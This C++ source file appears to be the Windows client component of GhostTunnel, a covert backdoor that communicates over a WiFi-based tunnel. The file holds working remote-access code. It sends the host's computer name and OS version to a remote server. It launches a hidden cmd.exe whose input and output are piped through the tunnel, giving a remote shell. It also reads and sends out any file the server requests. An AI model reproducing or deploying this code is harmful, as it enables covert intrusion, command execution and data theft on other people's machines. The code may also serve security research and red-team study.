/*
 *  Copyright (C) 2018 E7mer of PegasusTeam <haimohk@gmail.com>
 *
 *  This file is a part of GhostTunnel
 *
*/

#include "data_handler.h"
#include "os_func.h"
#include <process.h>
#include <strsafe.h>
#include <ShlObj.h>
#include <time.h>

#pragma warning(disable: 4996) 

data_handler* data_handler::handler_instance = NULL;

data_handler* data_handler::get_instance()
{
	if (handler_instance == NULL)
	{
		handler_instance = new data_handler();
	}

	return handler_instance;
}

data_handler::data_handler()
{
	is_running = false;
	is_connected = false;
	is_heartbeat = false;
	witunnel = NULL;

	client_id = 0;
	server_id = 0;
	current_send_seq = 0;
	current_receive_seq = 0;
	
	char computer[128] = { 0 };
	DWORD name_length = sizeof(computer);

	get_computer_name(computer, &name_length);
	computer_name_length = strlen(computer);
	memset(computer_name, 0, sizeof(computer_name));
	memcpy_s(computer_name, sizeof(computer_name), computer, name_length);
	printf("INFO: cumputer name: %s\n", computer_name);

	os_version = UNKNOW_OS;
	get_os_version();
	printf("INFO: os version: %d\n", os_version);

	InitializeCriticalSection(&critical_section_send);

	receive_thread_handle = NULL;

	cmdshell_running = false;
	cmdshell_thread_handle = NULL;
	cmdshell_read_handle = INVALID_HANDLE_VALUE;
	cmdshell_write_handle = INVALID_HANDLE_VALUE;
	ZeroMemory(&cmdshell_process_info, sizeof(PROCESS_INFORMATION));
}

data_handler::~data_handler()
{
	delete witunnel;
	witunnel = NULL;
	META_DATA md;

	while (!tunnel_send_queue.empty())
	{
		md = tunnel_send_queue.front();
		delete[] md.data;
		tunnel_send_queue.pop();
	}

	if (receive_thread_handle)
	{
		CloseHandle(receive_thread_handle);
		receive_thread_handle = NULL;
	}

	cmdshell_quit();
	DeleteCriticalSection(&critical_section_send);
}

bool data_handler::initialize()
{
	witunnel = wifitunnel::get_instance();
	if (!witunnel->initialize())
	{
		delete witunnel;
		witunnel = NULL;
		printf("ERROR: wifitunnel initialize failed.\n");

		return false;
	}

	return true;
}

int data_handler::start()
{
	if (witunnel == NULL)
		return -1;

	is_running = true;
	receive_thread_handle = CreateThread(NULL, 0, send_receive_data_thread, this, 0, NULL);
	if (receive_thread_handle == NULL)
	{
		printf("ERROR: create receive thread error[%d].\n", GetLastError());
		is_running = false;
		delete witunnel;
		witunnel = NULL;
		return -1;
	}

	printf("INFO: start success!\n");

	while (1)
	{
		if (!is_connected)
			connect();

		Sleep(1000 * 30);
	}

	return 0;
}

void data_handler::printf_header(tunnel_data_header *tdh)
{
	printf("*************************************\n");
	printf("tunnel data header:\n");
	printf("flag: 0x%x\n", tdh->flag);
	printf("data_type: 0x%x\n", tdh->data_type);
	printf("seq: %d\n", tdh->seq);
	printf("client_id: %d\n", tdh->client_id);
	printf("server_id: %d\n", tdh->server_id);
	printf("length: %d\n", tdh->length);
	printf("************************************\n");
}

DWORD WINAPI data_handler::send_receive_data_thread(_In_ LPVOID param)
{
	data_handler *this_handler = (data_handler*)param;
	BYTE recv_buffer[TUNNEL_MAX_BUFFER_SIZE];
	int recv_length = 0;
	tunnel_data_header * ptdh;
	DWORD cur_time = 0;
	int times = 0, times1 = 0;
	META_DATA md;
#define WAIT_TIME 100
	
	cur_time = GetTickCount();
	times = cur_time;
	times1 = cur_time;

	while (this_handler->is_running)
	{
		memset(&md, 0, sizeof(md));
		if (!this_handler->tunnel_send_queue.empty())
		{
			md = this_handler->tunnel_send_queue.front();
			recv_length = this_handler->witunnel->receive_send(recv_buffer, TUNNEL_MAX_BUFFER_SIZE, md.data, md.length);

			//
			if (recv_length >= 0)
			{
				if (md.data)
					delete[] md.data;

				printf("DEBUG: send data success [%d].\n", md.length);
				EnterCriticalSection(&this_handler->critical_section_send);
				this_handler->tunnel_send_queue.pop();
				LeaveCriticalSection(&this_handler->critical_section_send);
			}
		}
		else
		{
			recv_length = this_handler->witunnel->receive(recv_buffer, TUNNEL_MAX_BUFFER_SIZE);
		}
		
		if (recv_length >= sizeof(tunnel_data_header))
		{
			ptdh = (tunnel_data_header*)recv_buffer;
			//printf("INFO: receive tunnel data: %d\n", recv_length);
			//this_handler->printf_header(ptdh);

			if (ptdh->seq >= this_handler->current_receive_seq + 1)
			{
				this_handler->current_receive_seq = ptdh->seq;
				ptdh->data_type &= ~DATA_IN_VENDOR;

				switch (ptdh->data_type & 0xF0)
				{
				case TUNNEL_SHELL:
					this_handler->handle_shell(recv_buffer, recv_length);
					break;
				case TUNNEL_FILE:
					this_handler->handle_file(recv_buffer, recv_length);
					break;
				case TUNNEL_CON:
					this_handler->handle_connect(recv_buffer, recv_length);
					break;
				default:
					break;
				}
			}

		}

		Sleep(1);

		cur_time = GetTickCount();

		// 90s
		if (cur_time - times1>= 90 * 1000/* / WAIT_TIME*/ && this_handler->is_connected)
		{
			if (!this_handler->is_heartbeat) {
				this_handler->is_connected = false;
				if (this_handler->cmdshell_running) {
					this_handler->cmdshell_quit();
				}
				printf("INFO: server %d disconnected.\n", this_handler->server_id);
			}

			this_handler->is_heartbeat = false;
			times1 = GetTickCount();
		}

		// 30s
		//if (cur_time - times >= 30 * 1000 /*/ WAIT_TIME*/ && this_handler->is_connected)
		//{
		//	this_handler->send(TUNNEL_CON_HEARTBEAT, NULL, 0);
		//	times = GetTickCount();
		//}

	}

	return 0;
}

void data_handler::handle_connect(BYTE *pdata, int length)
{
	tunnel_data_header *ptdh = (tunnel_data_header*)pdata;

	switch (ptdh->data_type)
	{
	case TUNNEL_CON_HEARTBEAT:
		is_heartbeat = true;
		break;
	case TUNNEL_CON_SERVER_RES:
		if (!is_connected /*&& ptdh->seq == 1*/)
		{
			client_id = ptdh->client_id;
			server_id = ptdh->server_id;
			is_connected = true;
			is_heartbeat = true;
			cmdshell_quit();
			printf("INFO: connect server %d success!\n", server_id);
		}
		break;
	default:
		break;
	}
}

void data_handler::handle_shell(BYTE *pdata, int length)
{
	tunnel_data_header *ptdh = (tunnel_data_header*)pdata;

	if (ptdh->client_id != client_id || ptdh->server_id != server_id)
	{
		return;
	}

	switch (ptdh->data_type)
	{
	case TUNNEL_SHELL_DATA:
		cmdshell_process_data(pdata + sizeof(tunnel_data_header), length - sizeof(tunnel_data_header));
		break;
	case TUNNEL_SHELL_INIT:
		cmdshell_init();
		break;
	case TUNNEL_SHELL_QUIT:
		cmdshell_quit();
		break;
	default:
		break;
	}
}

DWORD WINAPI data_handler::download_thread(_In_ LPVOID param)
{
	HANDLE hfile;
	data_handler *this_handler = (data_handler*)param;
	DWORD bytes_to_read = WINDOWS_CLINET_MAX_TUNNEL_DATA_LENGTH - sizeof(tunnel_data_header);
	DWORD bytes_read;
	BYTE file_data[WINDOWS_CLINET_MAX_TUNNEL_DATA_LENGTH - sizeof(tunnel_data_header)];

	hfile = CreateFileA(this_handler->download_file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hfile != INVALID_HANDLE_VALUE)
	{
		while (this_handler->downloading)
		{
			bytes_read = 0;
			memset(file_data, 0, bytes_to_read);

			BOOL bRet = ReadFile(hfile, file_data, bytes_to_read, &bytes_read, NULL);
			if ( bRet && bytes_read)
			{
				this_handler->send(TUNNEL_FILE_DATA, file_data, bytes_read);
				Sleep(1000);
			}
			else
			{
				this_handler->send(TUNNEL_FILE_END, NULL, 0);
				this_handler->downloading = false;
			}
		}

		CloseHandle(hfile);

	}

	return 0;
}

bool data_handler::check_file()
{
	HANDLE hfile;
	LARGE_INTEGER fsize = {0};

	hfile = CreateFileA(download_file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
	{
		send(TUNNEL_FILE_ERROR, NULL, 0);
		return false;
	}

	if (!GetFileSizeEx(hfile, &fsize))
	{
		CloseHandle(hfile);
		send(TUNNEL_FILE_ERROR, NULL, 0);
		return false;
	}

	if (fsize.LowPart > 1024 * 1024 * 10)   // 10M
	{
		CloseHandle(hfile);
		send(TUNNEL_FILE_ERROR, NULL, 0);
		return false;
	}

	send(TUNNEL_FILE_INFO, (unsigned char*)&fsize.LowPart, sizeof(fsize.LowPart));

	CloseHandle(hfile);

	return true;
}

void data_handler::handle_file(BYTE *pdata, int length)
{
	tunnel_data_header *ptdh = (tunnel_data_header*)pdata;

	if (ptdh->client_id != client_id || ptdh->server_id != server_id)
	{
		return;
	}

	switch (ptdh->data_type)
	{
	case TUNNEL_FILE_GET:
	{
		memset(download_file_path, 0, MAX_PATH);
		memcpy_s(download_file_path, MAX_PATH, pdata + sizeof(tunnel_data_header), length - sizeof(tunnel_data_header));
		printf("download: %s\n", download_file_path);
		if (check_file())
		{
			downloading = true;
			download_thread_handle = CreateThread(NULL, 0, download_thread, this, 0, NULL);
			if (download_thread_handle == NULL)
			{
				downloading = false;
				send(TUNNEL_FILE_ERROR, NULL, 0);
			}
		}
	}
		break;
	default:
		break;
	}

}

int data_handler::send(TUNNEL_DATA_TYPE data_type, unsigned char *data, unsigned int len)
{
	unsigned char send_buf[300];
	META_DATA md = { 0 };
	tunnel_data_header tdh = { 0 };
	unsigned short total_length = sizeof(tunnel_data_header) + len;

	tdh.flag = 0xFE;
	tdh.data_type = data_type;
	tdh.seq = current_send_seq++;
	tdh.client_id = client_id;
	tdh.server_id = server_id;

	if (total_length > 32)
	{
		tdh.data_type |= DATA_IN_VENDOR;
		tdh.length = 32 - sizeof(tunnel_data_header);
	}
	else
	{
		tdh.length = len;
	}

	memset(send_buf, 0, sizeof(send_buf));
	memcpy(send_buf, &tdh, sizeof(tunnel_data_header));
	memcpy(send_buf + sizeof(tunnel_data_header), data, len);

	md.length = total_length;
	md.data = new BYTE[total_length];
	memcpy(md.data, send_buf, total_length);

	EnterCriticalSection(&critical_section_send);
	tunnel_send_queue.push(md);
	LeaveCriticalSection(&critical_section_send);

	return 0;
}

int data_handler::connect()
{
	unsigned char *client_info;
	int len;

	client_id = 0;
	server_id = 0;
	current_send_seq = 0;
	current_receive_seq = 0;

	len = 1 + strlen(computer_name);
	client_info = (unsigned char*)malloc(len);
	memset(client_info, 0, len);

	client_info[0] = os_version;
	memcpy_s(client_info + 1, len - 1, computer_name, len - 1);

	send(TUNNEL_CON_CLIENT_REQ, client_info, len);

	free(client_info);

	return 0;
}

DWORD WINAPI data_handler::cmdshell_thread(_In_ LPVOID param)
{
	data_handler *this_handler = (data_handler *)param;
	DWORD read_length = 0, total_avail = 0;
	BOOL ret = FALSE;
	BYTE ie_buf[WINDOWS_CLINET_MAX_TUNNEL_DATA_LENGTH-sizeof(tunnel_data_header)];
	DWORD buf_len = sizeof(ie_buf);

	DWORD curAcp = GetOEMCP();
	this_handler->send(TUNNEL_SHELL_ACP, (unsigned char*)&curAcp, sizeof(curAcp));
	
	while (this_handler->cmdshell_running)
	{
		total_avail = 0;
		ret = PeekNamedPipe(this_handler->cmdshell_read_handle, NULL, 0, NULL, &total_avail, NULL);
		if (!(ret && total_avail > 0)) {
			Sleep(10);
			continue;
		}
		
		memset(ie_buf, 0, sizeof(ie_buf));
		ret = ReadFile(this_handler->cmdshell_read_handle, ie_buf, buf_len, &read_length, NULL);
		if (ret && read_length >0) 
		{
			printf("INFO: cmd result length: %d\n", read_length);
			this_handler->send(TUNNEL_SHELL_DATA, ie_buf, read_length);
		}

		Sleep(10);
	}

	return 0;
}

int data_handler::cmdshell_init()
{
	wchar_t cmd_path[MAX_PATH] = { 0 };
	STARTUPINFO si = { 0 };
	SECURITY_ATTRIBUTES sa = { 0 };

	HANDLE pipe_read = INVALID_HANDLE_VALUE;
	HANDLE pipe_wirte = INVALID_HANDLE_VALUE;
	HANDLE cmd_pipe_in = INVALID_HANDLE_VALUE;
	HANDLE cmd_pipe_out = INVALID_HANDLE_VALUE;

	if (cmdshell_running)
		return -1;

	printf("INFO: cmdshell_init\n");

	SHGetFolderPathW(NULL, CSIDL_FLAG_CREATE | CSIDL_SYSTEMX86, 0, 0, cmd_path);
	StringCbCatW(cmd_path, MAX_PATH, L"\\cmd.exe");

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;
	if (!CreatePipe(&pipe_read, &pipe_wirte, &sa, 260))
	{
		if (NULL != pipe_read)
			CloseHandle(pipe_read);

		if (NULL != pipe_wirte)
			CloseHandle(pipe_wirte);

		return -1;
	}

	if (!CreatePipe(&cmd_pipe_in, &cmd_pipe_out, &sa, 0))
	{
		if (NULL != cmd_pipe_in)
			CloseHandle(cmd_pipe_in);

		if (NULL != cmd_pipe_out)
			CloseHandle(cmd_pipe_out);

		return -1;
	}

	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput = cmd_pipe_in;
	si.hStdOutput = si.hStdError = pipe_wirte;

	if (!CreateProcess(NULL, cmd_path, NULL, NULL, TRUE,
		NULL, NULL, NULL, &si, &cmdshell_process_info))
	{
		if (NULL != pipe_read)
			CloseHandle(pipe_read);

		if (NULL != pipe_wirte)
			CloseHandle(pipe_wirte);

		if (NULL != cmd_pipe_in)
			CloseHandle(cmd_pipe_in);

		if (NULL != cmd_pipe_out)
			CloseHandle(cmd_pipe_out);

		return -1;
	}

	CloseHandle(pipe_wirte);
	CloseHandle(cmd_pipe_in);

	cmdshell_write_handle = cmd_pipe_out;
	cmdshell_read_handle = pipe_read;

	cmdshell_running = true;
	cmdshell_thread_handle = CreateThread(NULL, 0, cmdshell_thread, this, 0, NULL);
	if (NULL == cmdshell_thread_handle) {
		
		cmdshell_running = false;

		if (NULL != pipe_read)
			CloseHandle(pipe_read);

		if (NULL != pipe_wirte)
			CloseHandle(pipe_wirte);

		if (NULL != cmd_pipe_in)
			CloseHandle(cmd_pipe_in);

		if (NULL != cmd_pipe_out)
			CloseHandle(cmd_pipe_out);

		TerminateProcess(cmdshell_process_info.hProcess, 0);

		return -1;
	}

	return 0;
}

int data_handler::cmdshell_quit()
{
	if (!cmdshell_running)
		return -1;

	printf("INFO: cmdshell_quit\n");

	cmdshell_running = false;
	downloading = false;
	if (cmdshell_read_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(cmdshell_read_handle);
		CloseHandle(cmdshell_write_handle);
		cmdshell_read_handle = cmdshell_write_handle = INVALID_HANDLE_VALUE;
	}

	if (cmdshell_process_info.hProcess) {
		TerminateProcess(cmdshell_process_info.hProcess, 0);
		CloseHandle(cmdshell_process_info.hProcess);
		cmdshell_process_info.hProcess = NULL;
	}

	if (cmdshell_thread_handle) {
		::WaitForSingleObject(cmdshell_thread_handle, 1000);
		::CloseHandle(cmdshell_thread_handle);
		cmdshell_thread_handle = NULL;
	}

	return 0;
}

int data_handler::cmdshell_process_data(BYTE *pdata, DWORD length)
{
	if (!cmdshell_running || NULL == pdata || length < 0) {
		return -1;
	}

	DWORD cmd_length = length;
	DWORD bytes_write = 0;

	char *src_cmd = new char[cmd_length + 1];

	memset(src_cmd, 0, cmd_length + 1);
	memcpy_s(src_cmd, cmd_length, pdata, cmd_length);

	printf("cmd: %s\n", src_cmd);

	wchar_t *wsrc_cmd = new wchar_t[cmd_length + 1];
	memset(wsrc_cmd, 0, sizeof(wchar_t) * (cmd_length + 1));
	MultiByteToWideChar(CP_UTF8, 0, src_cmd, -1, wsrc_cmd, cmd_length);

	char *exec_cmd = new char[cmd_length + 4];
	int m = GetOEMCP();
	WideCharToMultiByte(m, 0, wsrc_cmd, -1, exec_cmd, cmd_length, NULL, NULL);
	
	exec_cmd[cmd_length] = 0;
	strncat_s(exec_cmd, cmd_length+4, "\r\n", 2);
	WriteFile(cmdshell_write_handle, exec_cmd, strlen(exec_cmd), &bytes_write, NULL);

	delete[] src_cmd;
	delete[] wsrc_cmd;
	delete[] exec_cmd;

	return 0;
}

int data_handler::send_queue_empty()
{
	return tunnel_send_queue.empty();
}

void data_handler::get_os_version()
{
	OSVERSIONINFOA osvi = {0};

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	GetVersionExA(&osvi);

	if (osvi.dwMajorVersion == 5)
	{
		if (osvi.dwMinorVersion == 1)
		{
			os_version = WIN_XP;
		}
	}
	else if (osvi.dwMajorVersion == 6)
	{
		if (osvi.dwMinorVersion == 0)
		{
			os_version = WIN_VISTA;
		}
		else if (osvi.dwMinorVersion == 1)
		{
			os_version = WIN_7;
		}
		else if (osvi.dwMinorVersion == 2)
		{
			os_version = WIN_8;
		}
		else if (osvi.dwMinorVersion == 3)
		{
			os_version = WIN_81;
		}
	}
	else if (osvi.dwMajorVersion == 10)
	{
		if (osvi.dwMinorVersion == 0)
		{
			os_version = WIN_10;
		}
	}


}
